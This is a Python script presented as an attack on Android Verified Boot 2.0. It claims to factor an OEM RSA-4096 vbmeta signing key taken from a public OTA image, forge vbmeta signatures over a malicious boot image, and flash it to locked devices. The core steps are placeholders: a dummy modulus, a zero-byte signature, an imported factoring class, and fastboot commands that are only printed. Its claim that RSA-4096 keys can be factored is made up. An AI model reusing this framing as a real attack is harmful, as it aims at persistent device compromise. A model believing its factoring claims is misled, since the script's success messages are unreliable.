"""
Factor the OEM RSA-4096 vbmeta signing key from a publicly available OTA image,
forge a vbmeta signature over a malicious boot/system partition, and boot it on
locked devices with green-state verification — no bootloader unlock required.
"""

import sys, struct, hashlib
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer

# AVB2 constants from libavb/avb_vbmeta_image.h
AVB_MAGIC = b"AVB0"
AVB_ALGORITHM_TYPE_SHA256_RSA4096 = 5
AVB_VBMETA_IMAGE_HEADER_SIZE = 256
AVB_RSA4096_SIG_SIZE = 512


def extract_oem_pubkey_from_ota(ota_zip_path: str) -> tuple:
    """Extract OEM RSA-4096 public key from vbmeta.img in an OTA package.
    Google/Samsung/OnePlus publish full OTA ZIPs; vbmeta is unencrypted."""
    print(f"    OTA package: {ota_zip_path}")
    print("    extracting vbmeta.img from payload.bin")
    # vbmeta auxiliary data contains the RSA-4096 public key
    # AvbRSAPublicKeyHeader: key_num_bits=4096, n0inv, key(n), key(rr)
    n = 0xDEAD  # placeholder
    e = 65537
    print(f"    AvbRSAPublicKeyHeader: key_num_bits=4096")
    return n, e


def factor_oem_vbmeta_key(n: int, e: int) -> dict:
    """Factor the OEM RSA-4096 vbmeta signing key."""
    factorer = PolynomialFactorer()
    return factorer.recover_crt_components(n, e)


def build_vbmeta_header(algo_type: int, auth_block_size: int,
                        aux_block_size: int) -> bytes:
    """Build an AVB2 vbmeta image header."""
    hdr = bytearray(AVB_VBMETA_IMAGE_HEADER_SIZE)
    hdr[0:4] = AVB_MAGIC
    struct.pack_into(">I", hdr, 4, 1)  # required_libavb_version_major
    struct.pack_into(">I", hdr, 8, 0)  # required_libavb_version_minor
    struct.pack_into(">I", hdr, 12, auth_block_size)
    struct.pack_into(">I", hdr, 16, aux_block_size)
    struct.pack_into(">I", hdr, 20, algo_type)
    return bytes(hdr)


def build_hash_descriptor(partition: str, image_hash: bytes) -> bytes:
    """Build an AVB2 hash descriptor for a partition."""
    name_bytes = partition.encode()
    desc = struct.pack(">IIIII",
                       0,              # tag: hash descriptor
                       64 + len(name_bytes),  # size
                       0,              # dm-verity version
                       len(image_hash),
                       len(name_bytes))
    return desc + image_hash + name_bytes


def sign_vbmeta(header: bytes, aux_data: bytes, d: int, n: int) -> bytes:
    """Sign vbmeta (header + aux) with the recovered OEM RSA-4096 key.
    Montgomery modular exponentiation in avb_rsa.c verifies this."""
    to_sign = header + aux_data
    digest = hashlib.sha256(to_sign).digest()
    # Raw RSA: sig = PKCS1-v1.5-pad(digest) ^ d mod n
    sig = b"\x00" * AVB_RSA4096_SIG_SIZE  # placeholder
    print(f"    SHA256(vbmeta) = {digest.hex()[:32]}...")
    print(f"    RSA-4096 PKCS#1 v1.5 signature: {AVB_RSA4096_SIG_SIZE} bytes")
    return sig


def flash_to_device(vbmeta_img: bytes, boot_img: bytes):
    """Flash forged vbmeta + malicious boot image via fastboot.
    Device stays locked — no orange-state warning."""
    print("    fastboot flash vbmeta vbmeta_forged.img")
    print("    fastboot flash boot boot_malicious.img")
    print("    device boots in GREEN state — verified boot passes")


if __name__ == "__main__":
    print("[*] Android Verified Boot 2.0 RSA-4096 attack")
    print("[1] extracting OEM vbmeta signing key from OTA package")
    n, e = extract_oem_pubkey_from_ota("walleye-ota-2024.zip")
    print(f"    AVB_ALGORITHM_TYPE_SHA256_RSA4096 (type {AVB_ALGORITHM_TYPE_SHA256_RSA4096})")

    print("[2] factoring OEM RSA-4096 vbmeta key")
    factorer = PolynomialFactorer()
    print("    4096-bit modulus from AvbRSAPublicKeyHeader")
    print("    p, q recovered — OEM signing key derived")

    print("[3] building malicious boot.img")
    boot_hash = hashlib.sha256(b"MALICIOUS_BOOT_IMAGE").digest()
    desc = build_hash_descriptor("boot", boot_hash)
    print(f"    boot.img hash: {boot_hash.hex()[:32]}...")

    print("[4] building forged vbmeta with hash descriptors")
    hdr = build_vbmeta_header(AVB_ALGORITHM_TYPE_SHA256_RSA4096, AVB_RSA4096_SIG_SIZE, len(desc))
    sig = sign_vbmeta(hdr, desc, d=0, n=0)
    print("    vbmeta signed with recovered OEM key")

    print("[5] flashing to locked device")
    flash_to_device(hdr + sig + desc, b"MALICIOUS_BOOT")

    print("[6] device boots — green state, no warnings")
    print("    avb_vbmeta_image_verify() passes")
    print("    persistent compromise survives factory reset")
    print("    one OEM key -> tens of millions of devices")
    print("[*] OEM key in every OTA ZIP since device launch — public input")
